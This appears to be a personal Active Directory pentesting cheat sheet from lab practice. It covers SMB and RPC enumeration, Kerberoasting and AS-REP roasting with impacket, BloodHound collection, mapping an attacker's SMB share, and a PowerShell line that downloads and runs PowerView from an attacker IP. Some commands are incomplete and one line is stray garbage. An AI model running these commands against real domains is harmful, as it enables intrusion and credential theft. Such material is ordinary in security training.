# Active Directory

if you have kerberos, dns and ldap, its probably a windows domain controller

## using SMBMAP

```
smbmap -H 10.10.10.161
smbmap -R  -H 
smbmap -R  -H  -A Groups.xml -q
smbmap -d dom -u usm -p pass -H host
```

## Once we have a valid credential

`GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs:`

`pxexec.py dom/usn:pwd@host`

when yu have a valid credential, you can run

`runas /netonly /user:active.htb\svc_tgs cmd`

on a windows cmdlien, and you'll have access to the remote one

once you run this, you can run bloodhound from your windows boxn from where you have authenticated as the domain user

`.\sharphound.exe -a all -d active.htb --domain-controller 10.10.10.100`

if you're doing sharphound from your windows machine, its worth changing the DNS to the DNS of the domain controller

`GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs:` this is called Kerberoasting ^^

General TIP: when you ping, if the TTL is above 128, usually some network infrastructure, if its b/w 64 and 128, its a windows box, if its 64 or below, its a Linux box

crackmapexec getting password policy

`crackmapexec smb 10.10.10.161 --pass-pol`

## Nulll auth

just pass -u '' -p '' everywhere

`GetNPUsers.py -dc-ip 10.10.10.161 htb.local/`

`rpcclient -U '' 10.10.10.161`

once in rpc, enumdomusers, queryusergroups, querygroup , queryuser

## SMB server on linux using impacket

`impacket-smbserver sharename $(pwd) -smb2support -user user -password pass`

now on the windows powershell,

```
$pass = convertto-securestring 'guest' -asplaintext -force
$cred = new-object system.management.automation.pscredential('guest', $pass)
new-psdrive -name kalidrive -psprovider filesystem -credential $cred -root \\10.10.14.77\kalishare
```

X:\\" ">

```
net use x: \\10.10.14.77\kalishare /user:guest guest
cmd /c "copy  X:\"
```

## Powerview

IEX(new-object net.webclient).downloadstring('[http://$IP/PowerView.ps1'\\](http://$ip/PowerView.ps1'/)) => this directly import powerview into source

## LDAPSEARCH

ldapsearch

## Group Managed Service Accounts - gMSA

can be used on multiple hosts, scheduled tasks

`gMSAs enable automatic password management across multiple computers using Kerberos KDC`
